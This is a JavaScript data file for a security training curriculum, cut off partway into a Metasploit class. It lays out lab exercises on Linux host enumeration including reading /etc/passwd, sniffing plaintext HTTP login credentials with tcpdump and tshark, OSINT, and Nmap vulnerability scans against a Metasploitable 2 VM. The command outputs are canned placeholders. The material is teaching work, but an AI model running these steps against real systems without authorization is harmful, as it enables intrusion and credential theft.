// 24-Week Master Cybersecurity Curriculum Data (48 Classes - Fully Enriched ELI5)
window.CYBER_CURRICULUM = [
  {
    "id": 1,
    "week": 1,
    "classNumber": 1,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 1: Foundation & Traffic Analysis",
    "title": "Linux for Security & OS Reconnaissance",
    "category": "Reconnaissance",
    "difficulty": "Beginner",
    "duration": "90 - 120 Mins",
    "objective": "Gain Linux command-line fluency and discover host-level configurations through automated reconnaissance scripts.",
    "tools": [
      "Kali Linux",
      "Bash",
      "cron"
    ],
    "targetEnvironment": "Local Kali VM",
    "topology": {
      "description": "Lab topology for Linux for Security & OS Reconnaissance",
      "nodes": [
        {
          "id": "source",
          "label": "Kali Linux",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Local",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Reconnaissance",
        "explanation": "Gain Linux command-line fluency and discover host-level configurations through automated reconnaissance scripts."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Linux for Security & OS Reconnaissance",
        "description": "Verify system connectivity and tool installation in Local Kali VM.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "ip -br addr show",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Linux for Security & OS Reconnaissance",
        "description": "Deploy a fresh Kali Linux VM. Author and run a Bash script that automatically enumerates host user accounts, active services, open network connections, and cron jobs, piping the output into a clean target assessment file.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "uname -a && whoami",
            "description": "Execute uname command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          },
          {
            "shell": "bash",
            "cmd": "cat << 'EOF' > enum_host.sh",
            "description": "Execute cat command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          },
          {
            "shell": "bash",
            "cmd": "echo '=== USERS ==='",
            "description": "Execute echo command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          },
          {
            "shell": "bash",
            "cmd": "cut -d: -f1,3 /etc/passwd | grep -E ':([0-9]{4}|0)$'",
            "description": "Execute cut command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          },
          {
            "shell": "bash",
            "cmd": "echo '=== PORTS ==='",
            "description": "Execute echo command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          },
          {
            "shell": "bash",
            "cmd": "ss -tuln",
            "description": "Execute ss command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          },
          {
            "shell": "bash",
            "cmd": "EOF",
            "description": "Execute EOF command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          },
          {
            "shell": "bash",
            "cmd": "chmod +x enum_host.sh && ./enum_host.sh",
            "description": "Execute chmod command",
            "output": "[+] Command executed successfully.\nOutput: Linux user accounts, open sockets, and cron jobs logged to assessment file."
          }
        ],
        "verification": "Linux user accounts, open sockets, and cron jobs logged to assessment file.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Local Kali VM",
          "Kali Linux",
          "Linux user accounts, open sockets, and c...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is local reconnaissance often the first action of an adversary?",
        "hint": "UID 0 represents root; check /etc/passwd for accounts."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Linux for Security & OS Reconnaissance?",
      "options": [
        "Gain Linux command-line fluency and discover host-level configurations through automated reconnaissance scripts.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Gain Linux command-line fluency and discover host-level configurations through automated reconnaissance scripts."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 1.",
    "eli5Story": {
      "title": "The House Floorplan Tour (Linux for a 5-Year-Old)",
      "analogy": "Before you clean your bedroom or play hide-and-seek, you need to turn on the lights and see where the doors, cupboards, and toy boxes are! In Linux, we use simple words like 'whoami' to ask 'Who am I?', 'ls' to see our toys, and simple scripts to check all the open windows so nobody sneaks in."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 1",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Kali Linux",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Local Kali VM"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Kali Linux"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y kali."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 2,
    "week": 1,
    "classNumber": 2,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 1: Foundation & Traffic Analysis",
    "title": "Network Traffic & Packet Sniffing",
    "category": "Traffic Analysis",
    "difficulty": "Beginner",
    "duration": "90 - 120 Mins",
    "objective": "Capture local frame traffic and isolate sensitive plaintext data vectors using Wireshark and TCPDump.",
    "tools": [
      "Wireshark",
      "TCPDump",
      "HTTP"
    ],
    "targetEnvironment": "Simulated local network traffic",
    "topology": {
      "description": "Lab topology for Network Traffic & Packet Sniffing",
      "nodes": [
        {
          "id": "source",
          "label": "Wireshark",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Simulated",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Traffic Analysis",
        "explanation": "Capture local frame traffic and isolate sensitive plaintext data vectors using Wireshark and TCPDump."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Network Traffic & Packet Sniffing",
        "description": "Verify system connectivity and tool installation in Simulated local network traffic.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sudo tcpdump -i eth0 -nn -s 0 -w http_capture.pcap 'tcp port 80' &",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Unencrypted credentials username and password isolated in packet stream."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Network Traffic & Packet Sniffing",
        "description": "Initialize a Wireshark capture on an active interface. Generate traffic by submitting authentication forms to a local plaintext HTTP test server. Filter the resulting PCAP dump using http.request.method == 'POST' to locate and extract unencrypted user credentials.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "curl -s -X POST -d 'user=admin&pass=Secret2026' http://192.168.1.100/login.php",
            "description": "Execute curl command",
            "output": "[+] Command executed successfully.\nOutput: Unencrypted credentials username and password isolated in packet stream."
          },
          {
            "shell": "bash",
            "cmd": "sudo killall tcpdump",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Unencrypted credentials username and password isolated in packet stream."
          },
          {
            "shell": "bash",
            "cmd": "tshark -r http_capture.pcap -Y 'http.request.method == \"POST\"' -T fields -e http.file_data",
            "description": "Execute tshark command",
            "output": "[+] Command executed successfully.\nOutput: Unencrypted credentials username and password isolated in packet stream."
          }
        ],
        "verification": "Unencrypted credentials username and password isolated in packet stream.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Simulated local network traffic",
          "Wireshark",
          "Unencrypted credentials username and pas...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "How does TLS/HTTPS prevent this attack vector?",
        "hint": "Unencrypted HTTP transmits cleartext payloads over port 80."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Network Traffic & Packet Sniffing?",
      "options": [
        "Capture local frame traffic and isolate sensitive plaintext data vectors using Wireshark and TCPDump.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Capture local frame traffic and isolate sensitive plaintext data vectors using Wireshark and TCPDump."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 2.",
    "eli5Story": {
      "title": "The Postcard vs The Locked Secret Box (Packet Sniffing)",
      "analogy": "Imagine writing your secret lunch money password on a clear postcard and tossing it down the school hallway. Anyone standing in the hall can read it with their eyes! That is HTTP. In this lab, we use a special net called Wireshark to catch that clear postcard in the air."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 2",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Wireshark",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Simulated local network traffic"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Wireshark"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y wireshark."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 3,
    "week": 2,
    "classNumber": 3,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 2: Scanning & Enumeration",
    "title": "Open-Source Intelligence (OSINT)",
    "category": "Reconnaissance",
    "difficulty": "Beginner",
    "duration": "90 - 120 Mins",
    "objective": "Map an external target's infrastructure profile utilizing public data repositories.",
    "tools": [
      "theHarvester",
      "Maltego",
      "Recon-ng"
    ],
    "targetEnvironment": "Public domain data",
    "topology": {
      "description": "Lab topology for Open-Source Intelligence (OSINT)",
      "nodes": [
        {
          "id": "source",
          "label": "theHarvester",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Public",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Reconnaissance",
        "explanation": "Map an external target's infrastructure profile utilizing public data repositories."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Open-Source Intelligence (OSINT)",
        "description": "Verify system connectivity and tool installation in Public domain data.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "theHarvester -d example.com -l 200 -b duckduckgo,crtsh",
            "description": "Execute theHarvester command",
            "output": "[+] Command executed successfully.\nOutput: Discovery map of company subdomains, IP ranges, and MX mail endpoints."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Open-Source Intelligence (OSINT)",
        "description": "Use theHarvester from a Kali terminal to passively accumulate public subdomains and corporate emails from a live domain. Port this discovery index into Maltego to visually map structural associations between assets, name servers, and IP addresses.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "dig +short MX example.com",
            "description": "Execute dig command",
            "output": "[+] Command executed successfully.\nOutput: Discovery map of company subdomains, IP ranges, and MX mail endpoints."
          },
          {
            "shell": "bash",
            "cmd": "dig +short TXT example.com",
            "description": "Execute dig command",
            "output": "[+] Command executed successfully.\nOutput: Discovery map of company subdomains, IP ranges, and MX mail endpoints."
          }
        ],
        "verification": "Discovery map of company subdomains, IP ranges, and MX mail endpoints.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Public domain data",
          "theHarvester",
          "Discovery map of company subdomains, IP ...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is passive OSINT completely undetectable by target intrusion detection systems?",
        "hint": "Passive recon queries third-party indexes like search engines and certificate logs."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Open-Source Intelligence (OSINT)?",
      "options": [
        "Map an external target's infrastructure profile utilizing public data repositories.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Map an external target's infrastructure profile utilizing public data repositories."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 3.",
    "eli5Story": {
      "title": "The Public Phonebook and Map Explorer (OSINT)",
      "analogy": "Before detectives visit a building, they look at Google Maps, the town phonebook, and newspaper articles from home without ever touching the building's doorbell. That is Open-Source Intelligence (OSINT)!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 3",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with theHarvester",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Public domain data"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using theHarvester"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y theharvester."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 4,
    "week": 2,
    "classNumber": 4,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 2: Scanning & Enumeration",
    "title": "Active Vulnerability Scanning",
    "category": "Scanning",
    "difficulty": "Beginner",
    "duration": "90 - 120 Mins",
    "objective": "Identify network-accessible ports, service banners, and unpatched operating system bugs using Nmap.",
    "tools": [
      "Nmap",
      "Metasploitable 2",
      "netdiscover"
    ],
    "targetEnvironment": "Metasploitable 2 VM (192.168.1.105)",
    "topology": {
      "description": "Lab topology for Active Vulnerability Scanning",
      "nodes": [
        {
          "id": "source",
          "label": "Nmap",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Metasploitable",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Scanning",
        "explanation": "Identify network-accessible ports, service banners, and unpatched operating system bugs using Nmap."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Active Vulnerability Scanning",
        "description": "Verify system connectivity and tool installation in Metasploitable 2 VM (192.168.1.105).",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sudo netdiscover -r 192.168.1.0/24",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Nmap table revealing port 21 (vsftpd 2.3.4 backdoor), port 80 (Apache 2.2.8), and CVE-2011-2523."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Active Vulnerability Scanning",
        "description": "Execute a stealth TCP SYN scan (nmap -sS) against a local host interface. Apply service-version detection rules (-sV) to find outdated software headers, then invoke the Nmap Scripting Engine (--script vuln) to confirm an exploit fingerprint (e.g., vsftpd 2.3.4).",
        "commands": [
          {
            "shell": "bash",
            "cmd": "sudo nmap -sS -sV 192.168.1.105",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Nmap table revealing port 21 (vsftpd 2.3.4 backdoor), port 80 (Apache 2.2.8), and CVE-2011-2523."
          },
          {
            "shell": "bash",
            "cmd": "sudo nmap -p 21,80,3306 --script vuln 192.168.1.105",
            "description": "Execute sudo command",
            "output": "[+] Command executed successfully.\nOutput: Nmap table revealing port 21 (vsftpd 2.3.4 backdoor), port 80 (Apache 2.2.8), and CVE-2011-2523."
          }
        ],
        "verification": "Nmap table revealing port 21 (vsftpd 2.3.4 backdoor), port 80 (Apache 2.2.8), and CVE-2011-2523.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Metasploitable 2 VM (192.168.1.105)",
          "Nmap",
          "Nmap table revealing port 21 (vsftpd 2.3...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why does version detection matter more than knowing just which ports are open?",
        "hint": "Vulnerabilities attach directly to specific code versions, not just port numbers."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Active Vulnerability Scanning?",
      "options": [
        "Identify network-accessible ports, service banners, and unpatched operating system bugs using Nmap.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Identify network-accessible ports, service banners, and unpatched operating system bugs using Nmap."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 4.",
    "eli5Story": {
      "title": "Checking Every Door and Window in the Castle (Nmap Scanning)",
      "analogy": "Imagine a big castle with 65,535 little windows. Nmap is like a quick friendly guard who gently knocks on each window to see: Is it open? Who is sitting inside? And what name badge are they wearing? If an old broken lock is spotted, we write it down!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 4",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Nmap",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Metasploitable 2 VM (192.168.1.105)"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Nmap"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y nmap."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 5,
    "week": 3,
    "classNumber": 5,
    "phase": 1,
    "phaseTitle": "Phase 1: Offensive Security & Penetration Testing",
    "weekTitle": "Week 3: Exploitation & Password Cracking",
    "title": "The Metasploit Framework",
    "category": "Exploitation",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Deploy targeted payloads to weaponize software vulnerabilities.",
    "tools": [
      "Metasploit (msfconsole)",
      "Metasploitable 2"
    ],
    "targetEnvironment": "Metasploitable 2 VM",
    "topology": {
      "description": "Lab topology for The Metasploit Framework",
      "nodes": [
        {
          "id": "source",
          "label": "Metasploit (msfconsole)",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Metasploitable",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
